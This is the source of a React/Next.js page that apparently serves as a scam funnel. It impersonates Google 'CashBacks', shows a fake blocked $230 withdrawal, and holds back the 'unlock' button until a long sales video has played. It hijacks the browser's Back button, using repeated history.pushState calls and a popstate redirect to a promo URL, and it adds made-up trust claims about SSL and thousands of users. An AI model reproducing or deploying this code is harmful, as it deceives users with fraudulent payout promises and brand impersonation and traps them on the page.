"use client";

import Button from "@/components/button";
import Comments from "@/components/comments";
import VSLBlackAmz from "@/components/videos/vsl-black-amz";
import { useLayer } from '@/context/layer-provider';
import { useEffect, useState, useRef } from 'react';
import { CheckCheck, Loader2, Wallet, Lock } from 'lucide-react';
import Image from "next/image";

export default function Page() {

  // COMPONENT STATES
  const [visible, setVisible] = useState<boolean>(false);
  const visibleRef = useRef(visible);

  useEffect(() => {
    visibleRef.current = visible;
  }, [visible]);

  // IMPORT CONTEXT DATA
  const { host, active, frontLink } = useLayer();

  // SET CONTENT DATA
  const VSL = VSLBlackAmz;
  const videoId = "68b0ddfc19546f43f5842586";
  const backLink = `https://${host}/promo`;
  const pitchTime = 797;

  // VIDEO DELAY LOGIC (Time-based Sync)
  useEffect(() => {
    const storageKey = `vsl_start_${videoId}`;

    // 1. Initialize start time if not present
    let startTime = Number(localStorage.getItem(storageKey));
    if (!startTime) {
      startTime = Date.now();
      localStorage.setItem(storageKey, String(startTime));
    }

    // 2. Check function
    const checkTime = () => {
      if (visibleRef.current) return; // Check ref to avoid effect dependency change

      const elapsedSeconds = (Date.now() - startTime) / 1000;
      if (elapsedSeconds >= pitchTime) {
        setVisible(true);
      }
    };

    // 3. Run check immediately and then interval
    checkTime();
    const intervalId = setInterval(checkTime, 1000);

    return () => clearInterval(intervalId);
  }, [videoId]);

  // BACK REDIRECT
  useEffect(() => {
    function setBackRedirect(url: string) {
      let urlBackRedirect = url;
      urlBackRedirect =
        urlBackRedirect.trim() +
        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
        document.location.search.replace('?', '').toString();
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      window.addEventListener('popstate', () => {
        setTimeout(() => {
          location.href = urlBackRedirect;
        }, 1);
      });
    };

    setBackRedirect(backLink);
  }, [backLink]);

  return (
    <div className="flex flex-col min-h-screen bg-gray-100 font-sans selection:bg-green-100 pb-10">

      {/* COMPACT HEADER */}
      <div className="bg-white py-2 px-4 shadow-md sticky top-0 z-50 flex items-center justify-between h-14">
        <div className="flex items-center gap-1.5 opacity-90 hover:opacity-100 transition-opacity">
          <Image
            src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"
            alt="Google"
            width={75}
            height={24}
            className="w-[75px] h-auto object-contain"
            unoptimized
          />
          <div className="h-5 w-px bg-gray-300 mx-1"></div>
          <span className="text-gray-600 text-sm font-semibold tracking-tight mt-0.5">CashBacks</span>
        </div>

        <div className="bg-gradient-to-r from-[#34A853] to-[#2E8B46] text-white pl-2.5 pr-3 py-1.5 rounded-full shadow-sm shadow-green-100 flex items-center gap-2">
          <div className="p-1 bg-white/20 rounded-full">
            <Wallet size={12} className="text-white" />
          </div>
          <span className="font-bold text-sm tracking-wide">$ 230.00</span>
        </div>
      </div>

      {/* SUB-HEADER INFO */}
      <div className="bg-[#f8f9fa] py-3 px-4 border-b border-gray-200 mb-6 shadow-sm">
        <p className="text-gray-500 text-[11px] sm:text-xs text-center font-medium">
          Final step to release your withdrawal.
        </p>
      </div>

      {/* MAIN CONTENT */}
      <div className="flex-1 px-4 flex flex-col items-center pb-8">
        <div className="w-full max-w-md bg-white rounded-3xl shadow-[0_8px_30px_rgb(0,0,0,0.08)] p-5 sm:p-6 text-center border border-gray-100 relative overflow-hidden mb-6">

          <div className="flex items-center justify-center gap-2 mb-4">
            <div className="bg-red-50 text-red-600 p-1.5 rounded-full">
              <Lock size={14} strokeWidth={2.5} />
            </div>
            <span className="text-sm font-bold text-gray-800 uppercase tracking-wide">
              Withdrawal Bloqued
            </span>
          </div>

          <h1 className="text-xl sm:text-2xl font-bold text-gray-800 mb-2 leading-tight">
            Unlock your Balance
          </h1>

          <p className="text-gray-500 text-xs sm:text-sm mb-5 px-2">
            Watch the short video below to learn how to transfer the <strong className="text-green-600">$230.00</strong> to your account immediately.
          </p>

          {/* VIDEO CONTAINER */}
          <div className="w-full mb-5">
            <VSL />
          </div>

          <div className="bg-gray-50 p-3 rounded-xl border border-gray-100 mb-4">
            <p className="text-xs text-gray-500 leading-relaxed">
              <span className="font-bold text-gray-700">Important:</span> Thousands of users have already withdrawn. Follow the instructions in the video to avoid errors in bank transfer.
            </p>
          </div>

          {visible && (
            <div className="animate-fade-in-up mt-2">
              <Button
                onClick={() => {
                  window.location.href = frontLink;
                }}
                disabled={active}
                className="!w-full !rounded-xl !bg-[#34A853] !text-white !font-bold !text-base !py-4 !shadow-green-200 !shadow-lg hover:!translate-y-[-2px] hover:!shadow-xl transition-all uppercase tracking-wide flex items-center justify-center gap-2"
              >
                {active ? (
                  <Loader2 className="size-5 animate-spin" />
                ) : (
                  <CheckCheck className="size-5" />
                )}
                <span>UNLOCK WITHDRAWAL NOW</span>
              </Button>
            </div>
          )}

        </div>

        {/* Footer Trust Elements */}
        <div className="flex items-center gap-4 opacity-50 grayscale pb-6">
          <Image src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" width={60} height={20} unoptimized />
          <div className="h-4 w-px bg-gray-400"></div>
          <span className="text-xs font-semibold text-gray-500">Secure 256-bit SSL</span>
        </div>

        {/* COMMENTS SECTION */}
        <div className="w-full max-w-md">
          <Comments />
        </div>

      </div>

    </div>
  );
};